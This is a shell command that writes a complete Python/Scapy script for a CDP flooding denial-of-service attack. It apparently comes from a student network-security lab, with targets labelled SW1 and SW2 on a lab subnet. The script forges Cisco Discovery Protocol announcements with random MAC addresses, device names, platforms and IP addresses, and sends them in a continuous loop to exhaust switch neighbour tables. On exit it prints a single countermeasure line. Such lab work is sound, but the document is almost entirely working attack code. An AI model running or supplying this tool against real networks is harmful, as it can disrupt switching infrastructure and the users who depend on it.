cat > ~/ataques_20211150/01_cdp_dos.py << 'EOF'
#!/usr/bin/env python3
import sys, time, random, signal
from scapy.all import Ether, LLC, SNAP, sendp, conf

INTERFAZ  = "eth0"
DELAY     = 0.05
enviados  = 0
corriendo = True

def salir(sig, frame):
    print(f"\n[!] Detenido. Paquetes enviados: {enviados}")
    print("  CONTRAMEDIDA: SW1(config)# no cdp run")
    sys.exit(0)

def mac_aleatoria():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0,255) for _ in range(5))

def checksum_cdp(data):
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def tlv(tipo, valor):
    largo = 4 + len(valor)
    return tipo.to_bytes(2,'big') + largo.to_bytes(2,'big') + valor

def construir_cdp(src_mac):
    device_id = f"Switch-{random.randint(1000,9999)}".encode()
    plat      = random.choice([
                    b"cisco WS-C3750-48P",
                    b"cisco WS-C2960-24TC-L",
                    b"cisco ISR4451-X/K9"
                ])
    ip_bytes  = bytes([20, 21,
                       random.randint(1,254),
                       random.randint(1,254)])
    port      = f"GigabitEthernet0/{random.randint(0,48)}".encode()
    version   = f"Cisco IOS 15.{random.randint(0,7)}.{random.randint(0,9)}M".encode()
    t1 = tlv(0x0001, device_id)
    addr_data = (
        b'\x00\x00\x00\x01'
        b'\x01\x01\xcc'
        b'\x00\x04'
        + ip_bytes
    )
    t2 = tlv(0x0002, addr_data)
    t3 = tlv(0x0003, port)
    t4 = tlv(0x0004, b'\x00\x00\x00\x01')
    t5 = tlv(0x0005, version)
    t6 = tlv(0x0006, plat)
    cdp_header = b'\x02\xb4\x00\x00'
    cdp_data   = cdp_header + t1 + t2 + t3 + t4 + t5 + t6
    ck = checksum_cdp(cdp_data)
    cdp_data = cdp_data[:2] + ck.to_bytes(2,'big') + cdp_data[4:]
    pkt = (
        Ether(src=src_mac, dst="01:00:0c:cc:cc:cc")
        / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
        / SNAP(OUI=0x00000C, code=0x2000)
    )
    return pkt / cdp_data

def main():
    global enviados
    interfaz = sys.argv[1] if len(sys.argv) > 1 else INTERFAZ
    signal.signal(signal.SIGINT, salir)
    conf.verb = 0
    print("=" * 50)
    print("  ATAQUE CDP DoS - Matricula 20211150")
    print("=" * 50)
    print(f"  Interfaz : {interfaz}")
    print(f"  Target   : SW1 (20.21.11.2) / SW2 (20.21.11.3)")
    print(f"  Red      : 20.21.11.0/24")
    print("  Ctrl+C para detener\n")
    while corriendo:
        try:
            pkt = construir_cdp(mac_aleatoria())
            sendp(pkt, iface=interfaz, verbose=False)
            enviados += 1
            if enviados % 50 == 0:
                print(f"  [+] Paquetes CDP enviados: {enviados}", end="\r")
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break
        time.sleep(DELAY)

if __name__ == "__main__":
    main()
EOF
echo "Script creado OK"
